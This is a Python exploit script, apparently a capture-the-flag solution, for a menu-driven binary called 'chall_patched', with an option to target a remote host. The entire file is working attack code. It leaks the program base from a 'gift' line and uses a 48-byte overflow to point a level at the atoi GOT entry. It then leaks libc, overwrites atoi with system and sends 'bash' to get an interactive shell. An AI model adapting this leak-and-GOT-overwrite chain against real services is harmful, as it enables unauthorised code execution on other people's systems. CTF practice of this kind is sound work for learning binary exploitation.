#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        brva 0x0137A
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def create_level(idx: int):
    sla(b":", b"1")
    sla(b":", str(idx).encode())

def edit_level(data: bytes):
    sla(b":", b"2")
    sla(b": ", data)

def test_level():
    sla(b":", b"3")
    ru(b"data: ")
    data = rl()
    return data

def explore_level(idx: int):
    sla(b":", b"4")
    sla(b":", str(idx).encode())

def reset():
    sla(b":", b"5")

def exploit():

    ru(b"gift: ")
    main_leak = int(rl().strip(), 16)
    exe.address = main_leak - exe.sym["main"]
    slog("EXE base: ", exe.address)

    create_level(0)
    create_level(1)

    explore_level(0)
    edit_level(b"A"*48 + p64(exe.got["atoi"] - 64))
    reset()

    explore_level(1)
    explore_level(0)

    atoi = u64(test_level()[:8])
    libc.address = atoi - libc.sym["atoi"]
    slog("leak ", libc.address)

    edit_level(p64(libc.sym["system"]))

    sl(b"bash")


    interactive()

if __name__ == '__main__':
  exploit()
